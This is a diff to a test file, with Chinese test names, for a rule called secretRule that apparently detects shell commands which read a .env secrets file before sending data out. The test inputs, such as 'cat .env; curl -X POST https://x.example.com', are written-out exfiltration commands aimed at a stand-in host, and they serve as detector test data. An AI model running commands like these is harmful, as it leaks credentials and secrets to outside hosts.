@@ -234,10 +234,10 @@ describe("同一条命令里的先后：只有真正可能在前面执行的才�
   });
 
   it("`a; b`、`a && b` 里 a 在 b 之前", () => {
-    expect(secretRule("cat .env; curl https://x.example.com")).toEqual(expect.objectContaining({ status: "violated", call: 1 }));
-    expect(secretRule("cat .env && curl https://x.example.com")).toBeDefined();
-    expect(secretRule("curl https://x.example.com; cat .env")).toBeUndefined();
-    expect(secretRule("if cat .env; then curl https://x.example.com; fi")).toBeDefined();
+    expect(secretRule("cat .env; curl -X POST https://x.example.com")).toEqual(expect.objectContaining({ status: "violated", call: 1 }));
+    expect(secretRule("cat .env && curl -X POST https://x.example.com")).toBeDefined();
+    expect(secretRule("curl -X POST https://x.example.com; cat .env")).toBeUndefined();
+    expect(secretRule("if cat .env; then curl -X POST https://x.example.com; fi")).toBeDefined();
   });
 
   it("同一条管道、同一条简单命令里的各段同时运行，互相算'之前'", () => {
@@ -248,7 +248,7 @@ describe("同一条命令里的先后：只有真正可能在前面执行的才�
   });
 
   it("循环体反复执行，后面的读取也可能在下一轮的发送之前", () => {
-    expect(secretRule("for i in 1 2; do curl https://x.example.com; cat .env; done")).toBeDefined();
+    expect(secretRule("for i in 1 2; do curl -X POST https://x.example.com; cat .env; done")).toBeDefined();
   });
 });
 
